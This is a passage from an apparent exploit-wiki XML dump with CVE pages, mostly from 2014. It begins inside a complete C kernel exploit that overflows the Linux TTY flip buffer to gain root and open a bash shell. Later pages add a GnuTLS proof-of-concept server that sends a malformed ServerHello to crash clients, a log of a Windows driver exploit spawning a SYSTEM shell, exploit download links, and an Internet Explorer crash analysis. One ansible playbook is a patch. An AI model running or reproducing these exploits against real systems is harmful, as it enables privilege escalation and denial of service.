 * necessarily lead to an immediate kernel crash, but you should be prepared
 * for the worst (i.e. kernel oopsing in a bad state). In theory this would be
 * avoidable by reading /proc/slabinfo on systems where it is still available
 * to unprivileged users.
 *
 * Caveat: The vulnerability should be exploitable all the way from
 * v2.6.31-rc3, however relevant changes to the TTY subsystem were made in
 * commit acc0f67f307f52f7aec1cffdc40a786c15dd21d9 ("tty: Halve flip buffer
 * GFP_ATOMIC memory consumption") that make exploitation simpler, which this
 * exploit relies on.
 *
 * Thanks to Jon Oberheide for his help on exploitation technique.
 */

#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;pthread.h&gt;
#include &lt;pty.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;termios.h&gt;
#include &lt;unistd.h&gt;

#define TTY_MAGIC 0x5401

#define ONEOFF_ALLOCS 200
#define RUN_ALLOCS    30

struct device;
struct tty_driver;
struct tty_operations;

typedef struct {
	int counter;
} atomic_t;

struct kref {
	atomic_t refcount;
};

struct tty_struct_header {
	int	magic;
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
} overwrite;

typedef int __attribute__((regparm(3))) (* commit_creds_fn)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* prepare_kernel_cred_fn)(unsigned long cred);

int master_fd, slave_fd;
char buf[1024] = {0};
commit_creds_fn commit_creds;
prepare_kernel_cred_fn prepare_kernel_cred;

int payload(void) {
	commit_creds(prepare_kernel_cred(0));

	return 0;
}

unsigned long get_symbol(char *target_name) {
	FILE *f;
	unsigned long addr;
	char dummy;
	char name[256];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL)
		return 0;

	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **)&amp;addr, &amp;dummy, name);
		if (ret == 0) {
			fscanf(f, "%s\n", name);
			continue;
		}

		if (!strcmp(name, target_name)) {
			printf("[+] Resolved %s: %p\n", target_name, (void *)addr);

			fclose(f);
			return addr;
		}
	}

	printf("[-] Couldn't resolve \"%s\"\n", name);

	fclose(f);
	return 0;
}

void *overwrite_thread_fn(void *p) {
	write(slave_fd, buf, 511);

	write(slave_fd, buf, 1024 - 32 - (1 + 511 + 1));
	write(slave_fd, &amp;overwrite, sizeof(overwrite));
}

int main() {
	char scratch[1024] = {0};
	void *tty_operations[64];
	int i, temp_fd_1, temp_fd_2;

	for (i = 0; i &lt; 64; ++i)
		tty_operations[i] = payload;

	overwrite.magic                 = TTY_MAGIC;
	overwrite.kref.refcount.counter = 0x1337;
	overwrite.dev                   = (struct device *)scratch;
	overwrite.driver                = (struct tty_driver *)scratch;
	overwrite.ops                   = (struct tty_operations *)tty_operations;

	puts("[+] Resolving symbols");

	commit_creds = (commit_creds_fn)get_symbol("commit_creds");
	prepare_kernel_cred = (prepare_kernel_cred_fn)get_symbol("prepare_kernel_cred");
	if (!commit_creds || !prepare_kernel_cred)
		return 1;

	puts("[+] Doing once-off allocations");

	for (i = 0; i &lt; ONEOFF_ALLOCS; ++i)
		if (openpty(&amp;temp_fd_1, &amp;temp_fd_2, NULL, NULL, NULL) == -1) {
			puts("[-] pty creation failed");
			return 1;
		}

	printf("[+] Attempting to overflow into a tty_struct...");
	fflush(stdout);

	for (i = 0; ; ++i) {
		struct termios t;
		int fds[RUN_ALLOCS], fds2[RUN_ALLOCS], j;
		pthread_t overwrite_thread;

		if (!(i &amp; 0xfff)) {
			putchar('.');
			fflush(stdout);
		}

		if (openpty(&amp;master_fd, &amp;slave_fd, NULL, NULL, NULL) == -1) {
			puts("\n[-] pty creation failed");
			return 1;
		}

		for (j = 0; j &lt; RUN_ALLOCS; ++j)
			if (openpty(&amp;fds[j], &amp;fds2[j], NULL, NULL, NULL) == -1) {
				puts("\n[-] pty creation failed");
				return 1;
			}

		close(fds[RUN_ALLOCS / 2]);
		close(fds2[RUN_ALLOCS / 2]);

		write(slave_fd, buf, 1);

		tcgetattr(master_fd, &amp;t);
		t.c_oflag &amp;= ~OPOST;
		t.c_lflag |= ECHO;
		tcsetattr(master_fd, TCSANOW, &amp;t);

		if (pthread_create(&amp;overwrite_thread, NULL, overwrite_thread_fn, NULL)) {
			puts("\n[-] Overwrite thread creation failed");
			return 1;
		}
		write(master_fd, "A", 1);
		pthread_join(overwrite_thread, NULL);

		for (j = 0; j &lt; RUN_ALLOCS; ++j) {
			if (j == RUN_ALLOCS / 2)
				continue;

			ioctl(fds[j], 0xdeadbeef);
			ioctl(fds2[j], 0xdeadbeef);

			close(fds[j]);
			close(fds2[j]);
		}

		ioctl(master_fd, 0xdeadbeef);
		ioctl(slave_fd, 0xdeadbeef);

		close(master_fd);
		close(slave_fd);

		if (!setresuid(0, 0, 0)) {
			setresgid(0, 0, 0);

			puts("\n[+] Got it :)");
			execl("/bin/bash", "/bin/bash", NULL);
		}
	}
}

&lt;/pre&gt;</text>
      <sha1>srmr62p8le6pzozw3z0ihn2mgj2blel</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0291 Patch openssl with ansible 漏洞</title>
    <ns>0</ns>
    <id>808</id>
    <revision>
      <id>1065</id>
      <timestamp>2021-04-07T02:58:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Usage== &lt;pre&gt; pip install ansible ansible-playbook -i your_inventory_file patch-openssl-CVE-2015-0291_CVE-2015-0204 &lt;/pre&gt;  &lt;pre&gt; 192.168.0.10 webserver1.example.com webserv..."</comment>
      <origin>1065</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1712" sha1="fqve9ortt909jxgoa1j0zs26krap9vs" xml:space="preserve">==Usage==
&lt;pre&gt;
pip install ansible
ansible-playbook -i your_inventory_file patch-openssl-CVE-2015-0291_CVE-2015-0204
&lt;/pre&gt;

&lt;pre&gt;
192.168.0.10
webserver1.example.com
webserver2.example.com
db1.example.com
&lt;/pre&gt;


==EXP==
&lt;pre&gt;
---
- hosts: all
  vars:
  openssl_packages: ["openssl", "libssl3"]
  openssl_impacted_service:
     - nginx
     - httpd
     - postgresql
     - php5-fpm
     - openvpn
     - postfix
     - monit
     - zabbix-server
     - unbound
  tasks:
    - name: ensure openssl is the last version
      yum: name={{item}} state=latest
      register: openssl_updated
      with_items: openssl_packages
      when: ansible_os_family == "RedHat"

    - name: check if service need to be restarted
      shell: "lsof -n | grep 'DEL.*libssl3.so'"
      register: result_check
      failed_when: result_check.stdout.find('unrecognized') != -1 and result_check.rc != 0
      changed_when: result_check.stdout.find('unrecognized') == -1 or result_check.rc == 0
      always_run: yes

    - name: test running services
      command: "service {{item}} status | grep -i running"
      register: services_status
      with_items: openssl_impacted_service
      when: result_check.rc == 0 or openssl_updated.changed
      ignore_errors: true
      always_run: yes

    - name: restart running service
      service: name={{item.item}} state=restarted
      with_items: services_status.results
      when: (result_check.rc == 0 or openssl_updated.changed ) and item.rc == 0

    - name: ensure no more service need to be restarted
      shell: "lsof -n | grep 'DEL.*libssl3.so'"
      register: result
      failed_when: result.rc == 0
      changed_when: result.rc != 1
      always_run: yes

&lt;/pre&gt;</text>
      <sha1>fqve9ortt909jxgoa1j0zs26krap9vs</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0472 Django任意模塊執行漏洞</title>
    <ns>0</ns>
    <id>809</id>
    <revision>
      <id>1066</id>
      <timestamp>2021-04-07T03:01:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The django.core.urlresolvers.reverse function in Django before 1.4.11, 1.5.x before 1.5.6, 1.6.x before 1.6.3, and 1.7.x before 1.7 beta 2 allows remote attackers to..."</comment>
      <origin>1066</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="381" sha1="97yz9pnqhw2atbokr5igfinp1ukwbbu" xml:space="preserve">==INFO==
The django.core.urlresolvers.reverse function in Django before 1.4.11, 1.5.x before 1.5.6, 1.6.x before 1.6.3, and 1.7.x before 1.7 beta 2 allows remote attackers to import and execute arbitrary Python modules by leveraging a view that constructs URLs using user input and a "dotted Python path."

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-0472.zip</text>
      <sha1>97yz9pnqhw2atbokr5igfinp1ukwbbu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-0816 Norman Security Suite本地權限提升漏洞</title>
    <ns>0</ns>
    <id>811</id>
    <revision>
      <id>1068</id>
      <timestamp>2021-04-07T03:05:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Usage== &lt;pre&gt; C:\Users\user\Desktop&gt; exploit_ngs.exe [*] Exploit Norman General Security Driver (ngs.sys / ngs64.sys) [*] Target file version: ver 5.0.740.0. [*] An address..."</comment>
      <origin>1068</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="857" sha1="jd25xjwdrttq4x64yc3pittnld2ziw7" xml:space="preserve">==Usage==
&lt;pre&gt;
C:\Users\user\Desktop&gt; exploit_ngs.exe
[*] Exploit Norman General Security Driver (ngs.sys / ngs64.sys)
[*] Target file version: ver 5.0.740.0.
[*] An address file was created at C:\Users\user\Desktop\address.bin.
[*] Shellcode is located at 000000013F9357D0.
[*] The device was opened as 0000000000000044.
[*] The address file was opened as FFFFFFFF80000558.
[+] HalDispatchTable[1] is located at FFFFF800033FDC68.
[+] HalDispatchTable[1] was altered.
[+] Shellcode was executed.
[+] The SYSTEM shell was launched.
[*] Press any key to finish this program.
&lt;/pre&gt;


&lt;pre&gt;
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user\Desktop&gt;whoami
nt authority\system
&lt;/pre&gt;

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-0816.zip


[[File:Demo_win7_x64.png|800px]]</text>
      <sha1>jd25xjwdrttq4x64yc3pittnld2ziw7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-1266 Apple iOS 6.x SSL欺騙漏洞</title>
    <ns>0</ns>
    <id>812</id>
    <revision>
      <id>1069</id>
      <timestamp>2021-04-07T03:07:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The SSLVerifySignedServerKeyExchange function in libsecurity_ssl/lib/sslKeyExchange.c in the Secure Transport feature in the Data Security component in Apple iOS 6.x..."</comment>
      <origin>1069</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="570" sha1="2642u12vn5951znyco206b7x4z1g6z0" xml:space="preserve">==INFO==
The SSLVerifySignedServerKeyExchange function in libsecurity_ssl/lib/sslKeyExchange.c in the Secure Transport feature in the Data Security component in Apple iOS 6.x before 6.1.6 and 7.x before 7.0.6, Apple TV 6.x before 6.0.2, and Apple OS X 10.9.x before 10.9.2 does not check the signature in a TLS Server Key Exchange message, which allows man-in-the-middle attackers to spoof SSL servers by (1) using an arbitrary private key for the signing step or (2) omitting the signing step.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-1266.zip</text>
      <sha1>2642u12vn5951znyco206b7x4z1g6z0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-1303 Apple Safari 7.0.2 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>813</id>
    <revision>
      <id>1070</id>
      <timestamp>2021-04-07T03:11:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Heap-based buffer overflow in Apple Safari 7.0.2 allows remote attackers to execute arbitrary code and bypass a sandbox protection mechanism via unspecified vectors,..."</comment>
      <origin>1070</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="447" sha1="jpgfior51sdzrkcyqo1vt2yqgsjt5dj" xml:space="preserve">==INFO==
Heap-based buffer overflow in Apple Safari 7.0.2 allows remote attackers to execute arbitrary code and bypass a sandbox protection mechanism via unspecified vectors, as demonstrated by Liang Chen during a Pwn2Own competition at CanSecWest 2014.



==Usage==
&lt;pre&gt;
$ python server.py
$ cd /path/to/webkitgtk2.1.2/
$ ./Programs/GtkLauncher http://localhost
&lt;/pre&gt;


==POC==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-1303.zip</text>
      <sha1>jpgfior51sdzrkcyqo1vt2yqgsjt5dj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-1447 libvirt before 1.2.1 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>814</id>
    <revision>
      <id>1071</id>
      <timestamp>2021-04-07T03:15:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Race condition in the virNetServerClientStartKeepAlive function in libvirt before 1.2.1 allows remote attackers to cause a denial of service (libvirtd crash) by closi..."</comment>
      <origin>1071</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="303" sha1="9hlbod34drymeuggj2sc1m3nm75nypj" xml:space="preserve">==INFO==
Race condition in the virNetServerClientStartKeepAlive function in libvirt before 1.2.1 allows remote attackers to cause a denial of service (libvirtd crash) by closing a connection before a keepalive response is sent.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-1447.zip</text>
      <sha1>9hlbod34drymeuggj2sc1m3nm75nypj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-1773 Internet Explorer內存損壞漏洞</title>
    <ns>0</ns>
    <id>815</id>
    <revision>
      <id>1072</id>
      <timestamp>2021-04-07T03:20:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; CClipStack::PushClipRect() Invalid Array Indexing  First, starting with the callstack from the crash with pageheap enabled:  ChildEBP RetAddr  0919aac8 6b58459f..."</comment>
      <origin>1072</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5616" sha1="q42becntgzvv2akom4p4llpqwc78xzz" xml:space="preserve">==INFO==
&lt;pre&gt;
CClipStack::PushClipRect() Invalid Array Indexing

First, starting with the callstack from the crash with pageheap enabled:

ChildEBP RetAddr 
0919aac8 6b58459f MSHTML!CWorldTransform::IsAxisAligned
0919ab40 6ba228e9 MSHTML!CDispSurface::CClipStack::PushClipRect+0x1a2
0919aba4 6be25b58 MSHTML!CDispSurface::PushClipRectInternal+0x2f
0919abc0 6bf1118f MSHTML!CDispSurface::PushClipRectUser+0x26
0919ac24 6bf1157e MSHTML!CCanvasCompositor::ClearRightAndBelowRenderedRegion+0xcd
0919acd8 6b28108c MSHTML!CCanvasCompositor::ExecuteCompositionEffects+0x34d
0919ace0 6b2802f4 MSHTML!CCanvasCompositor::Flush+0x3d
0919ace8 6bf0c867 MSHTML!CCanvasCompositor::~CCanvasCompositor+0x10
0919ae28 6bf0b668 MSHTML!CCanvasRenderingContext2D::StrokeRectInternal+0x1b3
0919ae70 6bf0e032 MSHTML!CCanvasRenderingContext2D::ExecuteStrokeRect+0x1c5
0919aebc 6bd74b6f MSHTML!CCanvasRenderingContext2D::Var_strokeRect+0xac
0919aee0 6ae7056e MSHTML!CFastDOM::CCanvasRenderingContext2D::Trampoline_strokeRect+0x3b
0919af50 6ae6cdda jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x165
0919b328 6ae6dc86 jscript9!Js::InterpreterStackFrame::Process+0x1e74
0919b474 09560fd9 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x1e7

If we step back one function, this guy sets the object pointer that is used by the crash:

.text:63CDE575 ; public: long __thiscall CDispSurface::CClipStack::PushClipRect(class CRectF const &amp;, class CWorldTransform const *, bool, bool)
.text:63CDE575 mov edi, edi
.text:63CDE577 push ebp
.text:63CDE578 mov ebp, esp
.text:63CDE57A sub esp, 64h
.text:63CDE57D and [ebp+var_8], 0
.text:63CDE581 mov edx, ecx
.text:63CDE583 push ebx
.text:63CDE584 push esi
.text:63CDE585 mov esi, [ebp+arg_0]
.text:63CDE588 push edi
.text:63CDE589 lea edi, [ebp+var_28]
.text:63CDE58C mov [ebp+var_4], edx
.text:63CDE58F movsd
.text:63CDE590 movsd
.text:63CDE591 movsd
.text:63CDE592 movsd
.text:63CDE593 mov esi, [ebp+arg_4]
.text:63CDE596 test esi, esi
.text:63CDE598 jnz loc_63B1A8DF
.text:63CDE59E
.text:63CDE59E loc_63CDE59E:
.text:63CDE59E imul ecx, [edx+4], 18h
.text:63CDE5A2 xor bl, bl
.text:63CDE5A4 mov eax, [edx+8] 
.text:63CDE5A7 add eax, 0FFFFFFE8h
.text:63CDE5AA add eax, ecx
.text:63CDE5AC mov [ebp+arg_0], eax
.text:63CDE5AF mov edi, [eax+14h]

The outer object, CDispSurface, contains a CClipStack object inside of it. The CClipStack
object starts at offset 0x64 into the CDispSurface object. CClipStack is basically just
a subclass of CImplAry it seems, which is a generic array class that Internet Explorer
uses all over the place for arrays. In the above function, CDispSurface::CClipStack::PushClipRect,
the 'this' pointer is the subobject CClipStack inside of the outer CDispSurface.

The CClipStack object looks something liek this:

DWORD dwMaxElems;
DWORD dwCurElems;
VOID *pElems;

So, looking at the above code, you can guess what is going on. What the above code is doing is
extracting the last element from the CClipStack array. Each element in the array is 0x18 bytes in size,
hence:

imul ecx, [edx+4], 18h ; dwCurElems * 0x18
mov eax, [edx+8] ;pElems

But then you can see the following:

add eax, 0FFFFFFE8h ; subtract 0x18 from pElems
add eax, ecx ; pElems += (dwCurElems * 0x18)

However, if the array is empty, dwCurElems * 0x18 '==' 0, and so pElems
will actually point BEHIND the start of the array, into the adjacent heap chunk
below it. The array itself contains objects of the type CWorldTransform, which you can
infer from the code that crashes shortly after extract the object from the array. ecx
is the object pointer taken from the 'mov edi, [eax+14h]' operation:

.text:63B1A940 ; public: bool __thiscall CWorldTransform::IsAxisAligned(void)const

.text:63B1A940 test dword ptr [ecx+8], 80000000h ;ecx == BAD

So, where is the array allocated:

MSHTML!CDispSurface::CClipStack::PushClipRect+0x32:
6b97e5a7 83c0e8 add eax,0FFFFFFE8h
0:013&gt; !heap -p -a eax
address 0c4b0fa0 found in
_DPH_HEAP_ROOT @ 211000
in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize)
c45123c: c4b0fa0 60 - c4b0000 2000
739f8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
77a95e7a ntdll!RtlDebugAllocateHeap+0x00000030
77a5a3ba ntdll!RtlpAllocateHeap+0x000000c4
77a25a70 ntdll!RtlAllocateHeap+0x0000023a
6b55c592 MSHTML!CImplAry::EnsureSizeWorker+0x00000061
6b584513 MSHTML!CDispSurface::BeginDraw+0x00000122
6b2847a0 MSHTML!CCanvasRenderingContext2D::BeginDraw+0x00000041
6b286155 MSHTML!CCanvasContextBase::OpenBitmapRenderTarget+0x00000014
6b283b77 MSHTML!CCanvasCompositor::Initialize+0x0000102f
6b285cf7 MSHTML!CCanvasRenderingContext2D::StrokeGeometry+0x00000131
6b285090 MSHTML!CCanvasRenderingContext2D::ExecuteStroke+0x000002c4
6b284dae MSHTML!CFastDOM::CCanvasRenderingContext2D::Trampoline_stroke+0x00000035
6ae7056e jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x00000165
6ae6cdda jscript9!Js::InterpreterStackFrame::Process+0x00001e74
6ae6dc86 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x000001e7

It is in the 0x60 LFH bin. We can control the chunk behind the array by doing some heap crafting.
But the bad part of that code above is that the calculation for extracting the object used is
this:

(BYTE *)pArrayStart - 0x18 + 0x14 =&gt; (BYTE *)pArrayStart - 0x4

That results in using the flags/index field of the LFH chunk header as an object pointer.
That's not really good as the bytes in that field are not super controllable (I think).



For seeing how to possibly control that second dword of the LFH header:

http://illmatics.com/Understanding_the_LFH.pdf


Collaboration with Sean Larsson
&lt;/pre&gt;</text>
      <sha1>q42becntgzvv2akom4p4llpqwc78xzz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-2734 Ruby OpenSSL CA私鑰欺騙漏洞</title>
    <ns>0</ns>
    <id>816</id>
    <revision>
      <id>1073</id>
      <timestamp>2021-04-07T03:21:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== https://gist.github.com/10446549"</comment>
      <origin>1073</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="40" sha1="nkob479hz2akpijy02h9e7l2pc1gs9y" xml:space="preserve">==POC==
https://gist.github.com/10446549</text>
      <sha1>nkob479hz2akpijy02h9e7l2pc1gs9y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-3153 Linux kernel through 3.14.5特權提升漏洞</title>
    <ns>0</ns>
    <id>817</id>
    <revision>
      <id>1074</id>
      <timestamp>2021-04-07T03:23:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-3153.zip"</comment>
      <origin>1074</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="lq9mq4v46f17wi5soh5gradrf576cs9" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-3153.zip</text>
      <sha1>lq9mq4v46f17wi5soh5gradrf576cs9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-3466 GnuTLS緩衝區漏洞</title>
    <ns>0</ns>
    <id>818</id>
    <revision>
      <id>1075</id>
      <timestamp>2021-04-07T03:24:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Usage== &lt;pre&gt; $ python poc.py 4433 &lt;/pre&gt;  &lt;pre&gt; $ ldd $(which wget)  ... 	libnettle.so.4 =&gt; /usr/lib/x86_64-linux-gnu/libnettle.so.4 (0x00007fa8a026e000) 	libgnutls.so.28 =..."</comment>
      <origin>1075</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4863" sha1="ntluzolccu4ajeq72mjj40dntvh7owh" xml:space="preserve">==Usage==
&lt;pre&gt;
$ python poc.py 4433
&lt;/pre&gt;

&lt;pre&gt;
$ ldd $(which wget) 
...
	libnettle.so.4 =&gt; /usr/lib/x86_64-linux-gnu/libnettle.so.4 (0x00007fa8a026e000)
	libgnutls.so.28 =&gt; /usr/lib/x86_64-linux-gnu/libgnutls.so.28 (0x00007fa89ff5c000)
...

$ ltrace -riS -e gnutls_handshake wget -d https://localhost:4433
...
  0.000096 [0x4308a0] wget-&gt;gnutls_handshake(0xdf5380, 4, 0xa4dd30, 0x7f30f2731620 &lt;unfinished ...&gt;
  0.000216 [0x7f30f246b807] SYS_writev(4, 0x7fffc0b9c970, 1)    = 272
  0.000067 [0x7f30f2473a4d] SYS_recvfrom(4, 0xdf7920, 5, 0)     = 5
  0.500357 [0x7f30f2473a4d] SYS_recvfrom(4, 0xdfbad0, 250, 0)   = 250
  0.000095 [0x7f30f2e408f0] --- SIGSEGV (Segmentation fault) ---
  0.004670 [0xffffffffffffffff] +++ killed by SIGSEGV +++

$ sudo apt-get install libgnutls28-dbg
$ gdb --args wget https://localhost:4433
...
(gdb) r
...
(gdb) bt full
...
#0  0x00007ffff79548f0 in _gnutls_supported_ciphersuites (session=session@entry=0xa5e380, 
    cipher_suites=cipher_suites@entry=0x7fffffffd340 &lt;incomplete sequence \366\245&gt;, 
    max_cipher_suite_size=max_cipher_suite_size@entry=512) at ciphersuites.c:1311
#1  0x00007ffff78c759a in _gnutls_client_set_ciphersuite (session=session@entry=0xa5e380, 
    suite=suite@entry=0xa64b5b '\377' &lt;repeats 111 times&gt;) at gnutls_handshake.c:1525
#2  0x00007ffff78cae15 in _gnutls_read_server_hello (datalen=&lt;optimized out&gt;, 
    data=0xa64a70 "\003\001S\213\177c\301\016\035r\n\263\370\247\017\365]ieXB\200\301\373Oۚ\252\004\243\323Kq\307\310", '\377' &lt;repeats 165 times&gt;..., session=0xa5e380) at gnutls_handshake.c:1778
#3  _gnutls_recv_hello (session=session@entry=0xa5e380, 
    data=0xa64a70 "\003\001S\213\177c\301\016\035r\n\263\370\247\017\365]ieXB\200\301\373Oۚ\252\004\243\323Kq\307\310", '\377' &lt;repeats 165 times&gt;..., datalen=&lt;optimized out&gt;) at gnutls_handshake.c:2222
#4  0x00007ffff78cb64f in _gnutls_recv_handshake (session=session@entry=0xa5e380, 
    type=type@entry=GNUTLS_HANDSHAKE_SERVER_HELLO, optional=optional@entry=0, buf=buf@entry=0x0)
    at gnutls_handshake.c:1442
...
&lt;/pre&gt;


==POC.py==
&lt;pre&gt;
#!/usr/bin/env python
#
# PoC for CVE-2014-3466 
# (gnutls: insufficient session id length check in _gnutls_read_server_hello)
#
# Author:   Aaron Zauner &lt;azet@azet.org&gt;
# License:  CC0 1.0 (https://creativecommons.org/publicdomain/zero/1.0)
#
import sys
import socket
import time

# Record Layer
R_Type          = '16'          # Handshake Protocol
R_Version       = '03 01'       # TLS 1.0
R_Length        = '00 fa'       # 250 Bytes

# Handshake Protocol: ServerHello
HS_Type         = '02'          # Handshake Type: ServerHello
HS_Length       = '00 00 f6'    # 246 Bytes
HS_Version      = '03 01'       # TLS 1.0
HS_Random       = '''
53 8b 7f 63 c1 0e 1d 72 0a b3 f8 a7 0f f5 5d 69 
65 58 42 80 c1 fb 4f db 9a aa 04 a3 d3 4b 71 c7
'''                             # Random (gmt_unix_time + random bytes)
HS_SessID_Len   = 'c8'          # Session ID Length 200 Bytes (!)
HS_SessID_Data  = '''
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
'''                             # Session ID Data (Payload)

MaliciousServerHello = (
    R_Type      + R_Version     + R_Length          + 
    HS_Type     + HS_Length     + HS_Version        + 
    HS_Random   + HS_SessID_Len + HS_SessID_Data
).replace(' ', '').replace('\n', '').decode('hex')

def main():
    try:
        PORT = int(sys.argv[1])
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('', PORT))
        sock.listen(1)
        print "-- started listener on port", PORT

        while True:
            conn, addr = sock.accept()
            print "&lt;&lt; client connected:", addr

            time.sleep(0.5) # wait for ClientHello :P
            if conn.send(MaliciousServerHello):
                print "&gt;&gt; sent payload to", addr[0]

            conn.close()
    finally:
        sock.close()

if __name__ == '__main__':
    if len(sys.argv) &lt;= 1:
       print "  Usage:\n\tpython poc.py [port]\n"
       exit(1)

    main()

&lt;/pre&gt;</text>
      <sha1>ntluzolccu4ajeq72mjj40dntvh7owh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-3551 Multiple XSS漏洞</title>
    <ns>0</ns>
    <id>819</id>
    <revision>
      <id>1076</id>
      <timestamp>2021-04-07T03:26:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Multiple cross-site scripting (XSS) vulnerabilities in the advanced-grading implementation in Moodle through 2.3.11, 2.4.x before 2.4.11, 2.5.x before 2.5.7, 2.6.x be..."</comment>
      <origin>1076</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="409" sha1="6esypsql87bdmea5d1xo203aphmh5od" xml:space="preserve">==INFO==
Multiple cross-site scripting (XSS) vulnerabilities in the advanced-grading implementation in Moodle through 2.3.11, 2.4.x before 2.4.11, 2.5.x before 2.5.7, 2.6.x before 2.6.4, and 2.7.x before 2.7.1 allow remote authenticated users to inject arbitrary web script or HTML via a crafted (1) qualification or (2) rating field in a rubric.


==XSS==
&lt;pre&gt;
../mod/assign/view.php?id={id}&amp;rownum=0
&lt;/pre&gt;</text>
      <sha1>6esypsql87bdmea5d1xo203aphmh5od</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-3566 POODLE攻擊明文數據獲取漏洞</title>
    <ns>0</ns>
    <id>820</id>
    <revision>
      <id>1077</id>
      <timestamp>2021-04-07T03:29:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other products, uses nondeterministic CBC padding, which makes it easier for man-in-the-middle attackers t..."</comment>
      <origin>1077</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
